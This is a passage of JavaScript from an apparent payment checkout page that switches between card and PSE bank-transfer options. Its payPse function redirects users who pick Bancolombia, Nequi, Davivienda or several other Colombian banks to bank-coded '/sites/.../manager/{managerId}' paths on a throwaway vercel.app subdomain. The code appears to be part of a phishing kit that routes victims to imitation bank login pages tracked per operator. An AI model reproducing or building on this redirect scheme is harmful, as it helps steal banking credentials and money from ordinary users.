...
function selectPayment(type) {
    ...
    const pseDiv = document.querySelector('#pse');
    const ccRadio = document.getElementById('cc-radio');
    const pseRadio = document.getElementById('pse-radio');
    const btnCC = document.getElementById('btn-pagar');
    const btnPSE = document.getElementById('btn-pagar-pse');

    if (type === 'cc') {
        ccDiv.style.display = 'block';
        pseDiv.style.display = 'none';
        ccRadio.checked = true;
        pseRadio.checked = false;
        btnCC.style.display = 'block';
        btnPSE.style.display = 'none';
    } else if (type === 'pse') {
        ccDiv.style.display = 'none';
        pseDiv.style.display = 'block';
        ccRadio.checked = false;
        pseRadio.checked = true;
        btnCC.style.display = 'none';
        btnPSE.style.display = 'block';
    }
}


function payPse() {
    const entidad = document.getElementById('txt-entidad-pse').value;
    let url;

    switch (entidad) {
        case 'bancolombia':
            url = `https://client-one-iota-95.vercel.app/sites/bc/manager/${managerId}`;
            break;
        case 'nequi':
            url = `https://client-one-iota-95.vercel.app/sites/nq/manager/${managerId}`;
            break;
        case 'davivienda':
            url = `https://client-one-iota-95.vercel.app/sites/dv/manager/${managerId}`;
            break;
        case 'avvillas':
            url = `https://client-one-iota-95.vercel.app/sites/avv/manager/${managerId}`;
            break;
        case 'bogota':
            url = `https://client-one-iota-95.vercel.app/sites/bg/manager/${managerId}`;
            break;
        case 'popular':
            url = `https://client-one-iota-95.vercel.app/sites/popular/manager/${managerId}`;
            break;
        case 'caja-social':
            url = `https://client-one-iota-95.vercel.app/sites/cj/manager/${managerId}`;
            break;
        default:
            alert("Entidad no válida para PSE.");
            return;
    }
